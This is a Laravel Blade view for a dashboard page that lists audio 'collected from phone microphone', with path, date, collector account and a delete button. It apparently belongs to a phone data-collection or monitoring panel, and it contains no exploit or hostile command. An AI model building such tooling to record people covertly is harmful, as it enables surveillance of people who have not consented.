@extends('data.datalayout')

@section('title')
Collected audio info
@endsection

@section('description')
Audio collected from phone microphone. Click on the icon to listen.
@endsection

@section('headers')
<th>#</th>
<th>Path</th>
<th>Date</th>
<th>Account</th>
@endsection

@section('info') 
@foreach($data as $l)
<tr>
        <th>{{$l->id}} </th>
        <th>{{$l->path}} </th>
        <th>{{$l->date}} </th>
        <th>{{$l->collectoruser->account}} </th>
        <th>
        {!!Form::open(['action' => ['AudioController@destroy', $l->id], 'method' => 'POST', 'class' => 'pull-right'])!!}
        {{Form::hidden('_method', 'DELETE')}}
        {{Form::submit('Delete', ['class' => 'btn btn-warning'])}}
        {!!Form::close()!!}
        </th>
</tr> 
@endforeach
@endsection

@section('name')
AudioController
@endsection

@section('search')
@include('data.search',['url'=>'audio','link'=>'audio'])
@endsection